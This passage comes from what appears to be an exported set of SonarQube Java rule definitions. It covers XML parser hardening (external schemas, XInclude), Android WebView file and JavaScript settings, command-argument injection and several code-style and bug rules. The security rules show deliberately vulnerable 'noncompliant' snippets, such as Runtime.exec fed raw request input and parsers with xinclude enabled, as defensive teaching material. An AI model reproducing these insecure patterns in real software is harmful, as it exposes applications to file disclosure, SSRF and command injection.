SchemaFactory.newInstance(XMLConstants.W3C_XML_SCHEMA_NS_URI);\nschemaFactory.setFeature(\"http://apache.org/xml/features/nonvalidating/load-external-dtd\", false);\n</pre>\n<p>For <a href=\"https://dom4j.github.io/\">Dom4j</a> library:</p>\n<pre>\nSAXReader xmlReader = new SAXReader(); // Noncompliant\nxmlReader.setFeature(\"http://apache.org/xml/features/nonvalidating/load-external-dtd\", false);\n</pre>\n<p>For <a href=\"http://www.jdom.org/\">Jdom2</a> library:</p>\n<pre>\nSAXBuilder builder = new SAXBuilder();\nbuilder.setFeature(\"http://apache.org/xml/features/nonvalidating/load-external-dtd\", false);\n</pre>\n<h3>Exceptions</h3>\n<p>This rules does not raise an issue when an <code>EntityResolver</code> is set.</p>\n<pre>\nDocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\nfactory.setValidating(true);\nDocumentBuilder builder = factory.newDocumentBuilder();\nbuilder.setEntityResolver(new MyEntityResolver());\n\nSAXBuilder builder = new SAXBuilder();\nbuilder.setFeature(\"http://apache.org/xml/features/nonvalidating/load-external-dtd\", true);\nbuilder.setEntityResolver(new EntityResolver());\n</pre>\n<h2>Resources</h2>\n<ul>\n  <li> <a\n  href=\"https://docs.oracle.com/en/java/javase/13/security/java-api-xml-processing-jaxp-security-guide.html#GUID-8CD65EF5-D113-4D5C-A564-B875C8625FAC\">Oracle Java Documentation</a> - XML External Entity Injection Attack </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A4_2017-XML_External_Entities_(XXE)\">Top 10 2017 Category A4 - XML External\n  Entities (XXE)</a> </li>\n  <li> <a href=\"https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html#java\">OWASP XXE Prevention Cheat\n  Sheet</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/611\">CWE-611 - Information Exposure Through XML External Entity Reference</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/827\">CWE-827 - Improper Control of Document Type Definition</a> </li>\n</ul>\n\n","impacts":[{"name":"security","level":"MEDIUM"}],"inDefaultProfile":false,"quickfix":"infeasible","ruleKey":"RSPEC-6374","summary":"XML parsers should not load external schemas","tags":["symbolic-execution"],"versions":{"serverEdition":"Developer","serverVersion":"9.4.0.54424","communityVersion":"9.4.0.54424"},"cleanCodeAttribute":"CONVENTIONAL","type":"Vulnerability"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Blocker","description":"<p>XML standard allows the inclusion of XML files with the <code>xinclude</code> element. When an XML parser component is set up with the\n<code>http://apache.org/xml/features/xinclude</code> feature, it will follow the standard and allow the inclusion of remote files.</p>\n<h2>Why is this an issue?</h2>\n<p>When the XML parser will encounter an <code>xinclude</code> element, it will try to load the file pointed to by the <code>href</code> attribute\ninto the document. Included files can either be local files found on the file system of the application server, or remote files that are downloaded\nover HTTP, SMB, or other protocols, depending on the capabilities of the application and server.</p>\n<p>The files that can be accessed that way are only limited by the entitlement of the application on the local system and the network filtering the\nserver is subject to.</p>\n<p>This issue is particularly severe when the XML parser is used to parse untrusted documents. For example, when user-submitted XML messages are\nparsed that way.</p>\n<h3>What is the potential impact?</h3>\n<p>Allowing the inclusion of arbitrary files in XML documents can have two main consequences depending on what type of file is included: local or\nremote.</p>\n<h4>Sensitive file disclosure</h4>\n<p>If the application allows the inclusion of arbitrary files through the use of the <code>xinclude</code> element, it might be used to disclose\narbitrary files from the local file system. Depending on the applicationâs permissions on the file system, configuration files, runtime secrets, or\nPersonally Identifiable Information could be leaked.</p>\n<p>This is particularly true if the affected parser is used to process untrusted XML documents.</p>\n<h4>Server-side request forgery</h4>\n<p>When used to retrieve remote files, the application will send network requests to remote hosts. Moreover, it will do so from its current network\nlocation, which can have severe consequences if the application server is located on a sensitive network, such as the company corporate network or a\nDMZ hosting other applications.</p>\n<p>Attackers exploiting this issue could try to access internal backend services or corporate file shares. It could allow them to access more\nsensitive files, bypass authentication mechanisms from frontend applications, or exploit further vulnerabilities in the local services. Note that, in\nsome cases, the requests sent from the application can be automatically authenticated on federated locations. This is often the case in Windows\nenvironments when using Active Directory federated authentication.</p>\n<h2>How to fix it in Java SE</h2>\n<h3>Code examples</h3>\n<p>The following code is vulnerable because it explicitly enables the <code>xinclude</code> feature.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nimport javax.xml.parsers.SAXParserFactory;\n\nSAXParserFactory factory = SAXParserFactory.newInstance();\n\nfactory.setXIncludeAware(true); // Noncompliant\nfactory.setFeature(\"http://apache.org/xml/features/xinclude\", true); // Noncompliant\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nimport javax.xml.parsers.SAXParserFactory;\n\nSAXParserFactory factory = SAXParserFactory.newInstance();\n\nfactory.setXIncludeAware(false);\nfactory.setFeature(\"http://apache.org/xml/features/xinclude\", false);\n</pre>\n<h2>How to fix it in Dom4j</h2>\n<h3>Code examples</h3>\n<p>The following code is vulnerable because it explicitly enables the <code>xinclude</code> feature.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"2\" data-diff-type=\"noncompliant\">\nimport org.dom4j.io.SAXReader;\n\nSAXReader xmlReader = new SAXReader();\nxmlReader.setFeature(\"http://apache.org/xml/features/xinclude\", true); // Noncompliant\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"2\" data-diff-type=\"compliant\">\nimport org.dom4j.io.SAXReader;\n\nSAXReader xmlReader = new SAXReader();\nxmlReader.setFeature(\"http://apache.org/xml/features/xinclude\", false);\n</pre>\n<h2>How to fix it in Jdom2</h2>\n<h3>Code examples</h3>\n<p>The following code is vulnerable because it explicitly enables the <code>xinclude</code> feature.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"3\" data-diff-type=\"noncompliant\">\nimport org.jdom2.input.SAXBuilder;\n\nSAXBuilder builder = new SAXBuilder();\nbuilder.setFeature(\"http://apache.org/xml/features/xinclude\", true); // Noncompliant\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"3\" data-diff-type=\"compliant\">\nimport org.jdom2.input.SAXBuilder;\n\nSAXBuilder builder = new SAXBuilder();\nbuilder.setFeature(\"http://apache.org/xml/features/xinclude\", false);\n</pre>\n<h3>How does this work?</h3>\n<p>The compliant code example explicitly prevents the inclusion of files in XML documents by setting the\n<code>http://apache.org/xml/features/xinclude</code> feature property to <code>false</code>.</p>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> OWASP - <a href=\"https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html#java\">OWASP XXE Prevention\n  Cheat Sheet</a> </li>\n  <li> Java documentation - <a\n  href=\"https://docs.oracle.com/en/java/javase/13/security/java-api-xml-processing-jaxp-security-guide.html#GUID-8CD65EF5-D113-4D5C-A564-B875C8625FAC\">XML External Entity Injection Attack</a> </li>\n  <li> W3C - <a href=\"https://www.w3.org/TR/xinclude-11/\">XML Inclusions (XInclude) Version 1.1</a> </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A4_2017-XML_External_Entities_(XXE)\">Top 10 2017 - Category A4 - XML External\n  Entities (XXE)</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A05_2021-Security_Misconfiguration/\">Top 10 2021 - Category A5 - Security Misconfiguration</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-mobile-top-10/2023-risks/m4-insufficient-input-output-validation\">Mobile Top 10 2024 Category M4\n  - Insufficient Input/Output Validation</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-mobile-top-10/2023-risks/m8-security-misconfiguration\">Mobile Top 10 2024 Category M8 - Security\n  Misconfiguration</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/611\">CWE-611 - Improper Restriction of XML External Entity Reference</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/827\">CWE-827 - Improper Control of Document Type Definition</a> </li>\n  <li> STIG Viewer - <a href=\"https://stigviewer.com/stigs/application_security_and_development/2024-12-06/finding/V-222608\">Application Security and\n  Development: V-222608</a> - The application must not be vulnerable to XML-oriented attacks. </li>\n</ul>\n\n","impacts":[{"name":"security","level":"BLOCKER"}],"inDefaultProfile":true,"quickfix":"infeasible","ruleKey":"RSPEC-6373","summary":"XML parsers should not allow inclusion of arbitrary files","tags":["symbolic-execution"],"versions":{"serverEdition":"Developer","serverVersion":"9.4.0.54424","communityVersion":"9.4.0.54424"},"cleanCodeAttribute":"CONVENTIONAL","type":"Vulnerability"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<p>Exposing the Android file system to WebViews is security-sensitive.</p>\n<p>Granting file access to WebViews, particularly through the <code>file://</code> scheme, introduces a risk of local file inclusion vulnerabilities.\nThe severity of this risk depends heavily on the specific <code>WebSettings</code> configured. Overly permissive settings can allow malicious scripts\nto access a wide range of local files, potentially exposing sensitive data such as Personally Identifiable Information (PII) or private application\ndata, leading to data breaches and other security compromises.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> You open files that may be created or altered by external sources. </li>\n  <li> You open arbitrary URLs from external sources. </li>\n</ul>\n<p>There is a risk if you answered yes to any of these questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>Avoid opening <code>file://</code> URLs from external sources in WebView components. If your application accepts arbitrary URLs from external\nsources, do not enable this functionality. Instead, utilize <code>androidx.webkit.WebViewAssetLoader</code> to access files, including assets and\nresources, via <code>http(s)://</code> schemes.</p>\n<p>For enhanced security, ensure that the options to load <code>file://</code> URLs are explicitly set to false.</p>\n<h2>Sensitive Code Example</h2>\n<pre>\nimport android.webkit.WebView;\n\nWebView webView = (WebView) findViewById(R.id.webview);\nwebView.getSettings().setAllowFileAccess(true); // Sensitive\nwebView.getSettings().setAllowContentAccess(true); // Sensitive\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nimport android.webkit.WebView;\n\nWebView webView = (WebView) findViewById(R.id.webview);\nwebView.getSettings().setAllowFileAccess(false);\nwebView.getSettings().setAllowContentAccess(false);\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A01_2021-Broken_Access_Control/\">Top 10 2021 Category A1 - Broken Access Control</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration\">Top 10 2017 Category A6 - Security\n  Misconfiguration</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-mobile-top-10/2023-risks/m8-security-misconfiguration\">Mobile Top 10 2024 Category M8 - Security\n  Misconfiguration</a> </li>\n  <li> OWASP - <a href=\"https://mas.owasp.org/checklists/MASVS-PLATFORM/\">Mobile AppSec Verification Standard - Platform Interaction Requirements</a>\n  </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/79\">CWE-79 - Improper Neutralization of Input During Web Page Generation ('Cross-site\n  Scripting')</a> </li>\n  <li> Android Documentation - <a href=\"https://developer.android.com/privacy-and-security/risks/webview-unsafe-file-inclusion\">WebViews - Unsafe File\n  Inclusion</a> </li>\n</ul>\n\n","impacts":[{"name":"security","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-6363","summary":"Enabling file access for WebViews is security-sensitive","tags":["cwe","android"],"versions":{"serverEdition":"Developer","serverVersion":"9.2.4.50792","communityVersion":"9.2.4.50792"},"cleanCodeAttribute":"CONVENTIONAL","type":"Security Hotspot"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<p>WebViews can be used to display web content as part of a mobile application. A browser engine is used to render and display the content. Like a web\napplication, a mobile application that uses WebViews can be vulnerable to Cross-Site Scripting if untrusted code is rendered. In the context of a\nWebView, JavaScript code can exfiltrate local files that might be sensitive or even worse, access exposed functions of the application that can result\nin more severe vulnerabilities such as code injection. Thus JavaScript support should not be enabled for WebViews unless it is absolutely necessary\nand the authenticity of the web resources can be guaranteed.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> The WebWiew only renders static web content that does not require JavaScript code to be executed. </li>\n  <li> The WebView contains untrusted data that could cause harm when rendered. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>It is recommended to disable JavaScript support for WebViews unless it is necessary to execute JavaScript code. Only trusted pages should be\nrendered.</p>\n<h2>Sensitive Code Example</h2>\n<pre>\nimport android.webkit.WebView;\n\nWebView webView = (WebView) findViewById(R.id.webview);\nwebView.getSettings().setJavaScriptEnabled(true); // Sensitive\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nimport android.webkit.WebView;\n\nWebView webView = (WebView) findViewById(R.id.webview);\nwebView.getSettings().setJavaScriptEnabled(false);\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A03_2021-Injection/\">Top 10 2021 Category A3 - Injection</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration\">Top 10 2017 Category A6 - Security\n  Misconfiguration</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A7_2017-Cross-Site_Scripting_(XSS)\">Top 10 2017 Category A7 - Cross-Site Scripting\n  (XSS)</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-mobile-top-10/2023-risks/m8-security-misconfiguration\">Mobile Top 10 2024 Category M8 - Security\n  Misconfiguration</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/79\">CWE-79 - Improper Neutralization of Input During Web Page Generation ('Cross-site\n  Scripting')</a> </li>\n</ul>\n<h3>Related rules</h3>\n<ul>\n  <li> {rule:java:S7409} - Exposing Java objects through JavaScript interfaces is security-sensitive </li>\n</ul>\n\n","impacts":[{"name":"security","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-6362","summary":"Enabling JavaScript support for WebViews is security-sensitive","tags":["cwe","android"],"versions":{"serverEdition":"Developer","serverVersion":"9.2.4.50792","communityVersion":"9.2.4.50792"},"cleanCodeAttribute":"CONVENTIONAL","type":"Security Hotspot"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>Since Java 9, <code>@Deprecated</code> has two additional arguments to the annotation:</p>\n<ul>\n  <li> <code>since</code> allows you to describe when the deprecation took place </li>\n  <li> <code>forRemoval</code>, indicates whether the deprecated element will be removed at some future date </li>\n</ul>\n<p>In order to ease the maintainers work, it is recommended to always add one or both of these arguments.</p>\n<p>This rule reports an issue when <code>@Deprecated</code> is used without any argument.</p>\n<h3>Noncompliant code example</h3>\n<pre>\n@Deprecated\n</pre>\n<h3>Compliant solution</h3>\n<pre>\n@Deprecated(since=\"4.2\", forRemoval=true)\n</pre>\n<h3>Exceptions</h3>\n<p>The members and methods of a deprecated class or interface are ignored by this rule. The classes and interfaces themselves are still subject to\nit.</p>\n<h2>Resources</h2>\n<h3>Related rules</h3>\n<ul>\n  <li> {rule:java:S1123} </li>\n</ul>\n\n","impacts":[{"name":"maintainability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-6355","summary":"Deprecated annotations should include explanations","tags":["java9"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CONVENTIONAL","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Minor","description":"<h2>Why is this an issue?</h2>\n<p>A regular expression is a sequence of characters that specifies a match pattern in text. Among the most important concepts are:</p>\n<ul>\n  <li> Character classes: defines a set of characters, any one of which can occur in an input string for a match to succeed. </li>\n  <li> Quantifiers: used to specify how many instances of a character, group, or character class must be present in the input for a match. </li>\n  <li> Wildcard (<code>.</code>): matches all characters except line terminators (also matches them if the <code>s</code> flag is set). </li>\n</ul>\n<p>Many of these features include shortcuts of widely used expressions, so there is more than one way to construct a regular expression to achieve the\nsame results. For example, to match a two-digit number, one could write <code>[0-9]{2,2}</code> or <code>\\d{2}</code>. The latter is not only shorter\nbut easier to read and thus to maintain.</p>\n<p>This rule recommends replacing some quantifiers and character classes with more concise equivalents:</p>\n<ul>\n  <li> <code>\\d</code> for <code>[0-9]</code> and <code>\\D</code> for <code>[^0-9]</code> </li>\n  <li> <code>\\w</code> for <code>[A-Za-z0-9_]</code> and <code>\\W</code> for <code>[^A-Za-z0-9_]</code> </li>\n  <li> <code>.</code> for character classes matching everything (e.g. <code>[\\w\\W]</code>, <code>[\\d\\D]</code>, or <code>[\\s\\S]</code> with\n  <code>s</code> flag) </li>\n  <li> <code>x?</code> for <code>x{0,1}</code>, <code>x*</code> for <code>x{0,}</code>, <code>x+</code> for <code>x{1,}</code>, <code>x{N}</code> for\n  <code>x{N,N}</code> </li>\n</ul>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\n\"[0-9]\"        // Noncompliant - same as \"\\\\d\"\n\"[^0-9]\"       // Noncompliant - same as \"\\\\D\"\n\"[A-Za-z0-9_]\" // Noncompliant - same as \"\\\\w\"\n\"[\\\\w\\\\W]\"     // Noncompliant - same as \".\"\n\"a{0,}\"        // Noncompliant - same as \"a*\"\n</pre>\n<p>Use the more concise version to make the regex expression more readable.</p>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\n\"\\\\d\"\n\"\\\\D\"\n\"\\\\w\"\n\".\"\n\"a*\"\n</pre>\n\n","impacts":[{"name":"maintainability","level":"LOW"}],"inDefaultProfile":true,"quickfix":"targeted","ruleKey":"RSPEC-6353","summary":"Regular expression quantifiers and character classes should be used concisely","tags":["regex"],"versions":{"serverEdition":"Developer","serverVersion":"9.5.0.56709","communityVersion":"9.5.0.56709"},"cleanCodeAttribute":"CLEAR","type":"Code Smell"},{"availability":["sonarcloud","sonarqube"],"defaultSeverity":"Major","description":"<p>Constructing arguments of system commands from user input is security-sensitive. It has led in the past to the following vulnerabilities:</p>\n<ul>\n  <li> <a href=\"https://www.cve.org/CVERecord?id=CVE-2016-9920\">CVE-2016-9920</a> </li>\n  <li> <a href=\"https://www.cve.org/CVERecord?id=CVE-2021-29472\">CVE-2021-29472</a> </li>\n</ul>\n<p>Arguments of system commands are processed by the executed program. The arguments are usually used to configure and influence the behavior of the\nprograms. Control over a single argument might be enough for an attacker to trigger dangerous features like executing arbitrary commands or writing\nfiles into specific directories.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> Malicious arguments can result in undesired behavior in the executed command. </li>\n  <li> Passing user input to a system command is not necessary. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> Avoid constructing system commands from user input when possible. </li>\n  <li> Ensure that no risky arguments can be injected for the given program, e.g., type-cast the argument to an integer. </li>\n  <li> Use a more secure interface to communicate with other programs, e.g., the standard input stream (stdin). </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<p>Arguments like <code>-delete</code> or <code>-exec</code> for the <code>find</code> command can alter the expected behavior and result in\nvulnerabilities:</p>\n<pre>\nString input = request.getParameter(\"input\");\nString cmd[] =  new String[] { \"/usr/bin/find\", input };\nRuntime.getRuntime().exec(cmd); // Sensitive\n</pre>\n<h2>Compliant Solution</h2>\n<p>Use an allow-list to restrict the arguments to trusted values:</p>\n<pre>\nString input = request.getParameter(\"input\");\nif (allowed.contains(input)) {\n  String cmd[] =  new String[] { \"/usr/bin/find\", input };\n  Runtime.getRuntime().exec(cmd);\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A03_2021-Injection/\">Top 10 2021 Category A3 - Injection</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A1_2017-Injection\">Top 10 2017 Category A1 - Injection</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/88\">CWE-88 - Argument Injection or Modification</a> </li>\n  <li> <a href=\"https://blog.sonarsource.com/php-supply-chain-attack-on-composer\">CVE-2021-29472</a> - PHP Supply Chain Attack on Composer </li>\n  <li> STIG Viewer - <a href=\"https://stigviewer.com/stigs/application_security_and_development/2024-12-06/finding/V-222609\">Application Security and\n  Development: V-222609</a> - The application must not be subject to input handling vulnerabilities. </li>\n</ul>\n\n","impacts":[{"name":"security","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":null,"ruleKey":"RSPEC-6350","summary":"Constructing arguments of system commands from user input is security-sensitive","tags":["cwe","injection"],"versions":{"serverEdition":"Developer","serverVersion":"9.2.4.50792","communityVersion":null},"cleanCodeAttribute":"LOGICAL","type":"Security Hotspot"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>There are several reasons to use a group in a regular expression:</p>\n<ul>\n  <li> to change the precedence (e.g. <code>do(g|or)</code> will match 'dog' and 'door') </li>\n  <li> to remember parenthesised part of the match in the case of capturing group </li>\n  <li> to improve readability </li>\n</ul>\n<p>In any case, having an empty group is most probably a mistake. Either it is a leftover after refactoring and should be removed, or the actual\nparentheses were intended and were not escaped.</p>\n<h3>Noncompliant code example</h3>\n<pre>\n\"foo()\"  // Noncompliant, will match only 'foo'\n</pre>\n<h3>Compliant solution</h3>\n<pre>\n\"foo\\\\(\\\\)\"  // Matches 'foo()'\n</pre>\n\n","impacts":[{"name":"maintainability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"targeted","ruleKey":"RSPEC-6331","summary":"Regular expressions should not contain empty groups","tags":["regex"],"versions":{"serverEdition":"Developer","serverVersion":"9.5.0.56709","communityVersion":"9.5.0.56709"},"cleanCodeAttribute":"CLEAR","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>Multiple spaces in a regular expression can make it hard to tell how many spaces should be matched. Itâs more readable to use only one space and\nthen indicate with a quantifier how many spaces are expected.</p>\n<h3>Noncompliant code example</h3>\n<pre>\nPattern.compile(\"hello   world\");\n</pre>\n<h3>Compliant solution</h3>\n<pre>\nPattern.compile(\"hello {3}world\");\n</pre>\n<h3>Exceptions</h3>\n<p>In <a href=\"https://www.regular-expressions.info/freespacing.html\">free-spacing mode</a> (<code>Pattern.COMMENTS</code> flag, or with embedded flag\nexpression <code>(?x)</code>), whitespaces are ignored. In this case no issue should be triggered, because the whitespaces may be intended to improve\nreadability.</p>\n\n","impacts":[{"name":"maintainability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"targeted","ruleKey":"RSPEC-6326","summary":"Regular expressions should not contain multiple spaces","tags":["regex"],"versions":{"serverEdition":"Developer","serverVersion":"9.5.0.56709","communityVersion":"9.5.0.56709"},"cleanCodeAttribute":"CLEAR","type":"Code Smell"},{"availability":["sonarcloud","sonarqube"],"defaultSeverity":"Critical","description":"<p>Many modification methods in the collection interfaces are optional. Some implementations do not implement those methods and throw a runtime\nexception (<code>UnsupportedOperationException</code>). To fix this issue, make sure you call modification methods on a collection implementation that\nsupports them.</p>\n<h2>Why is this an issue?</h2>\n<p>The Java Collections framework defines interfaces such as <code>java.util.List</code> or <code>java.util.Map</code>. Several implementation classes\nare provided for each of those interfaces to fill different needs: some of the implementations guarantee a few given performance characteristics, some\nothers ensure a given behavior, for example immutability.</p>\n<p>Among the methods defined by the interfaces of the Collections framework, some are declared as \"optional\": an implementation class may choose to\nthrow an <code>UnsupportedOperationException</code> when one of those methods is called. For example, <code>java.util.Collections.emptyList()</code>\nreturns an implementation of <code>java.util.List</code> which is documented as \"immutable\". Calling the <code>add</code> method on this object\ntriggers an <code>UnsupportedOperationException</code>.</p>\n<h3>What is the potential impact?</h3>\n<p>Issues of this type interrupt the normal execution of a program, causing it to crash or putting it into an inconsistent state. Therefore, this\nissue might impact the availability and reliability of your application, or even result in data loss.</p>\n<h2>How to fix it</h2>\n<p>When calling a method labeled as optional, you should make sure that the implementation class on which the call is made indeed supports this\nmethod.</p>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nList&lt;String&gt; list = Collections.emptyList(); // The list implementation returned here is unmodifiable.\nif (someCondition) {\n  list.add(\"hello\"); // Noncompliant; throws an UnsupportedOperationException\n}\nreturn list;\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nList&lt;String&gt; list = new ArrayList&lt;&gt;();\nif (someCondition) {\n  list.add(\"hello\");\n}\nreturn list;\n</pre>\n<p>or</p>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nif (someCondition) {\n  return Collections.singletonList(\"hello\");\n}\nreturn Collections.emptyList();\n</pre>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> <a href=\"https://docs.oracle.com/en/java/javase/17/docs/api/java.base/java/util/doc-files/coll-overview.html\">Collections Framework\n  Overview</a> in the Java documentation </li>\n  <li> <a href=\"https://docs.oracle.com/en/java/javase/17/docs/api/java.base/java/util/List.html\">List</a> in the Java documentation </li>\n  <li> <a href=\"https://docs.oracle.com/en/java/javase/17/docs/api/java.base/java/util/Set.html\">Set</a> in the Java documentation </li>\n  <li> <a href=\"https://docs.oracle.com/en/java/javase/17/docs/api/java.base/java/util/Map.html\">Map</a> in the Java documentation </li>\n</ul>\n\n","impacts":[{"name":"reliability","level":"HIGH"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-6322","summary":"Unsupported methods should not be called on some collection implementations","tags":[],"versions":{"serverEdition":"Developer","serverVersion":"9.5.0.56709","communityVersion":null},"cleanCodeAttribute":"LOGICAL","type":"Bug"},{"availability":["sonarcloud","sonarqube"],"defaultSeverity":"Critical","description":"<p>This issue indicates that a cast operation will fail and throw a <code>ClassCastException</code>. To fix it, make sure only references to objects\nwith a compatible type can be cast.</p>\n<h2>Why is this an issue?</h2>\n<p>A cast operation allows an object to be \"converted\" from one type to another. The compiler raises an error if it can determine that the target type\nis incompatible with the declared type of the object, otherwise it accepts the cast. However, depending on the actual runtime type of the object, a\ncast operation may fail at runtime. When a cast operation fails, a <code>ClassCastException</code> is thrown.</p>\n<h3>What is the potential impact?</h3>\n<p>This type of exception is usually unexpected. It causes the program to crash or puts it into an inconsistent state. Therefore, this issue might\nimpact the availability and reliability of your application, or even result in data loss.</p>\n<h2>How to fix it</h2>\n<p>When an object is cast, the code makes assumptions about the type of the object. A <code>ClassCastException</code> indicates that this assumption\nhas been broken. If the assumption is reasonable, then some prior logic should ensure that only objects of a compatible type can be cast. You should\ntry to identify the code responsible for these checks and fix it.</p>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nprivate String hexString(Object o) {\n  return Integer.toHexString((Integer) o); // Noncompliant if hexString is called with a String for example\n}\n</pre>\n<h4>Compliant solution</h4>\n<p>One possible solution is to change <code>hexString</code> to only accept integers and adapt call sites.</p>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nprivate String hexString(Integer i) {\n  return Integer.toHexString(i);\n}\n</pre>\n<p>Another one is to return a default value for types that are not <code>Integer</code>. Here, the <code>if</code> statement with the condition\nrelying on <code>instanceof</code> prevents references to objects with an incompatible type from making it to the cast operation.</p>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nprivate String hexString(Object o) {\n  if (o instanceof Integer) {\n    return Integer.toHexString((Integer) o);\n  }\n  return \"0x0\";\n}\n</pre>\n<p>The solution to adopt depends on which part of the code should be responsible to handle non-Integer types.</p>\n<h3>Going the extra mile</h3>\n<p>Casting is considered an anti-pattern in object-oriented programming. It is sometimes necessary, but there often is a better alternative.\nConsider:</p>\n<ul>\n  <li> Polymorphism </li>\n  <li> The visitor design pattern </li>\n  <li> Pattern matching </li>\n</ul>\n<p>They come with some guarantees from the compiler, making your code more reliable.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"2\" data-diff-type=\"noncompliant\">\nint foo(Shape shape) {\n  if (shape instanceof Circle) {\n    Circle circle = (Circle) shape;\n    // Code for objects of type Circle\n  } else if (shape instanceof Square) {\n    Square square = (Square) shape;\n    // Code for objects of type Square\n  }\n  // Default\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"2\" data-diff-type=\"compliant\">\nint foo(Shape shape) {\n  return shape.fooValue(...); // Code was moved into subclasses\n}\n</pre>\n<p>or</p>\n<pre data-diff-id=\"2\" data-diff-type=\"compliant\">\nint foo(Shape shape) {\n  return shape.accept(new FooVisitor()); // Code was moved into FooVisitor\n}\n</pre>\n<p>or</p>\n<pre data-diff-id=\"2\" data-diff-type=\"compliant\">\n// Java 14+ required\nint foo(Shape shape) {\n  if (shape instanceof Circle c) {\n    // Code for objects of type Circle\n  } else if (shape instanceof Square s) {\n    // Code for objects of type Square\n  }\n}\n</pre>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> <a href=\"https://docs.oracle.com/en/java/javase/17/docs/api/java.base/java/lang/ClassCastException.html\">ClassCastException</a> </li>\n</ul>\n<h3>Articles &amp; blog posts</h3>\n<ul>\n  <li> <a 